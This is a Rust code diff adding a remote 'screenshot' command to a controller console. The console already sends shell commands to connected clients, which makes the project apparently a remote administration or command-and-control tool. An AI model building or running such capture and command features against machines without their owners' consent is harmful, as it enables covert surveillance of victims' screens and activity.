@@ -1,4 +1,4 @@
-use std::{io::{self, Write, ErrorKind, Read}, sync::{Arc, Mutex}};
+use std::{io::{self, Write, ErrorKind, Read, Cursor}, sync::{Arc, Mutex}};
 use rand::{thread_rng, Rng};
 
 use crate::{server::Client, ServerCodes, ClientCodes, command::parse_quotes};
@@ -314,6 +314,78 @@ pub fn command_cmd(client: &mut Client, cmd: String) {
     client.stream.lock().unwrap().write_all(&msg).unwrap();
 }
 
+pub fn command_screenshot(client: &mut Client, args: Vec<String>) {
+    let mut msg = Vec::new();
+    msg.push(ServerCodes::MGetScreen as u8);
+    client.request();
+    let mut stream = client.stream.lock().unwrap();
+    stream.write_all(&msg).unwrap();
+    let mut data1 = [0u8; 1];
+
+    loop {
+        if let Err(err) = stream.read_exact(&mut data1) {
+            if err.kind() == ErrorKind::WouldBlock {
+                continue;
+            }
+
+            panic!("{}", err);
+        }
+
+        break;
+    }
+
+    if u8::from_be_bytes(data1) != ClientCodes::RBytes as u8 {
+        println!("Invalid response");
+        return;
+    }
+
+    let mut data2 = [0u8; 8];
+    stream.read_exact(&mut data2).unwrap();
+    let mut data3 = [0u8; 4];
+    stream.read_exact(&mut data3).unwrap();
+    let image_length = u32::from_be_bytes(data3);
+    let mut data4 = vec![0u8; image_length as usize];
+
+    loop {
+        if let Err(err) = stream.read_exact(&mut data4) {
+            if err.kind() == ErrorKind::WouldBlock {
+                continue;
+            }
+
+            panic!("{}", err);
+        }
+
+        break;
+    }
+
+    let image = screenshots::image::io::Reader::new(Cursor::new(data4)).with_guessed_format().unwrap().decode().unwrap();
+    // let image = screenshots::image::load_from_memory(&data4).unwrap();
+    let mut path = args[0].to_lowercase();
+
+    if path.ends_with(".jpg") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Jpeg).unwrap();
+    } else if path.ends_with(".png") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Png).unwrap();
+    } else if path.ends_with(".bmp") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Bmp).unwrap();
+    } else if path.ends_with(".ico") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Ico).unwrap();
+    } else if path.ends_with(".webp") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::WebP).unwrap();
+    } else if path.ends_with(".gif") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Gif).unwrap();
+    } else if path.ends_with(".avif") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Avif).unwrap();
+    } else if path.ends_with(".tiff") {
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Tiff).unwrap();
+    } else {
+        path.push_str(".png");
+        image.save_with_format(path.clone(), screenshots::image::ImageFormat::Png).unwrap();
+    }
+
+    println!("Image saved in '{}'", path);
+}
+
 pub fn controller_cli_start(clients: Arc<Mutex<Vec<Client>>>) {
     let mut stdout = io::stdout();
     let stdin = io::stdin();
@@ -527,6 +599,21 @@ pub fn controller_cli_start(clients: Arc<Mutex<Vec<Client>>>) {
                 }
 
                 get_client_text!(clients, cmd[4..].to_string(), selected_client, command_cmd, {
+                    println!("Selected client not found")
+                });
+            }
+            "screenshot" => {
+                if args.len() != 1 {
+                    println!("This command takes exactly 1 argument, {} given", args.len());
+                    continue;
+                }
+
+                if selected_client == 0 {
+                    println!("Select client with command `select <id>`");
+                    continue;
+                }
+
+                get_client!(clients, args, selected_client, command_screenshot, {
                     println!("Selected client not found")
                 });
             }
